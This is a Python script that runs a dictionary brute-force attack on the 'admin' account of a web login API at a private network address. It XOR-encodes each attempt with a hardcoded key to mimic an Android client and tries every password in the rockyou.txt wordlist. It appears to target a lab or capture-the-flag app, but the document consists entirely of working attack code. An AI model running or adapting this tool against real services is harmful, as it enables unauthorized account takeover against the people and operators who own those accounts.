import base64
import requests
import json

def decrypt(encoded_message):
    return _apply_xor(base64.b64decode(encoded_message).decode('utf-8'))

def encrypt(message):
    return base64.b64encode(_apply_xor(message).encode('utf-8')).decode('utf-8')

def _apply_xor(string):
    decrypted_string = ""
    key_length = len(KEY)
    for i in range(len(string)):
        decrypted_char = chr(ord(string[i]) ^ ord(KEY[i % key_length]))
        decrypted_string += decrypted_char
    return decrypted_string

def brute_force(password):
    global password_found
    data = f"{{\"username\":\"{username}\",\"password\":\"{password}\"}}"
    encrypted_data = encrypt(data)
    payload = {"enc_data": encrypted_data}
    json_payload = json.dumps(payload)
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Galaxy S10 Build/OPR6.170623.017)',
        'Connection': 'close',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    response = requests.post(url, headers=headers, data=json_payload)
    if len(response.text) != 147:
        print(f"\n\033[92m[+] Successful login with password: {password}\033[0m")
        response_data = response.json()
        enc_data = response_data.get('enc_data')
        print("\n\033[94m[+] Decrypted Response: " + decrypt(enc_data) + "\n")
        password_found = True  # Signal that password found
        return True  # Signal that password found
    return False

KEY = "amazing"
url = 'http://192.168.1.39:3000/api/user/login'
username = "admin"

print("\n\033[94m[+] Loading wordlist in memory...")
with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as file:
    passwords = file.read().splitlines()
print("[+] Wordlist was loaded successfully.")

print("[+] Starting attack...")

# Iterate over passwords
password_found = False
for password in passwords:
    if brute_force(password):
        password_found = True
        break

if password_found:
    print("[+] Password found, exiting.\n\033[0m")
else:
    print("\033[91m[-] Password not found.\033[0m")
